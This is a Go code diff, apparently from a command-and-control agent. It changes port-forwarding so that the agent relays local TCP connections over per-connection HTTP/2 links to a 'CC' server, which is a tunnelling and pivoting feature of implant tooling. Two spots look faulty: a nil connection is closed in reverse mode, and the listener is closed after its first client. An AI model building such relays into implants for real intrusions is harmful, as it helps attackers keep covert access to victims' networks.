@@ -137,17 +137,17 @@ func PortFwd(addr, sessionID string, reverse bool) (err error) {
 		return fmt.Errorf("Invalid address: %s", addr)
 	}
 
-	// request a port fwd
-	// connect CC
-	conn, ctx, cancel, err = ConnectCC(url)
-	log.Printf("PortFwd started: %s (%s)", addr, sessionID)
-
+	// connect via h2 to CC, or not
+	ctx, cancel = context.WithCancel(context.Background())
 	if reverse {
-		go listenForFwd(ctx, cancel, addr, sessionID, conn)
+		go listenAndFwd(ctx, cancel, addr, sessionID)
 	} else {
+		conn, ctx, cancel, err = ConnectCC(url)
+		log.Printf("PortFwd started: %s (%s)", addr, sessionID)
 		go fwdToDport(ctx, cancel, addr, sessionID, conn)
 	}
 
+	// remember to cleanup
 	defer func() {
 		cancel()
 		conn.Close()
@@ -165,25 +165,63 @@ func PortFwd(addr, sessionID string, reverse bool) (err error) {
 	// check if h2conn is disconnected,
 	// if yes, kill all goroutines and cleanup
 	for ctx.Err() == nil {
-		time.Sleep(1 * time.Second)
+		time.Sleep(100 * time.Millisecond)
 	}
 	return
 }
 
 // start a local listener on agent, forward connections to CC
-func listenForFwd(ctx context.Context, cancel context.CancelFunc,
-	from, sessionID string, h2 *h2conn.Conn) {
-	var err error
+func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
+	from, sessionID string) {
+	var (
+		url = CCAddress + tun.ProxyAPI
+		err error
+	)
 
 	// listen
 	l, err := net.Listen("tcp", from)
 	if err != nil {
 		log.Printf("listen on %s failed: %s", from, err)
 	}
-	defer func() {
-		cancel()
-		l.Close()
-	}()
+	defer cancel()
+
+	// serve a TCP connection received on agent side
+	serveConn := func(conn net.Conn) {
+		// start a h2 connection per incoming TCP connection
+		h2, _, h2cancel, err := ConnectCC(url)
+		if err != nil {
+			log.Printf("h2conn (%s) failed: %v", url, err)
+			return
+		}
+		defer func() {
+			defer h2cancel()
+			_, _ = h2.Write([]byte("exit\n"))
+			l.Close()
+		}()
+
+		// tell CC this is a subsession (same mapping but different h2 req)
+		_, err = h2.Write([]byte(sessionID))
+		if err != nil {
+			log.Printf("reverse port mapping hello: %v", err)
+			return
+		}
+
+		// iocopy
+		go func() {
+			defer conn.Close()
+			_, err = io.Copy(conn, h2)
+			if err != nil {
+				log.Printf("h2 -> conn: %v", err)
+			}
+		}()
+		go func() {
+			defer conn.Close()
+			_, err = io.Copy(h2, conn)
+			if err != nil {
+				log.Printf("conn -> h2: %v", err)
+			}
+		}()
+	}
 
 	// serve
 	for ctx.Err() == nil {
@@ -192,14 +230,7 @@ func listenForFwd(ctx context.Context, cancel context.CancelFunc,
 			log.Print(err)
 			continue
 		}
-		go func() {
-			defer conn.Close()
-			go io.Copy(conn, h2)
-			go io.Copy(h2, conn)
-			for ctx.Err() == nil {
-				time.Sleep(100 * time.Millisecond)
-			}
-		}()
+		go serveConn(conn)
 	}
 }
 
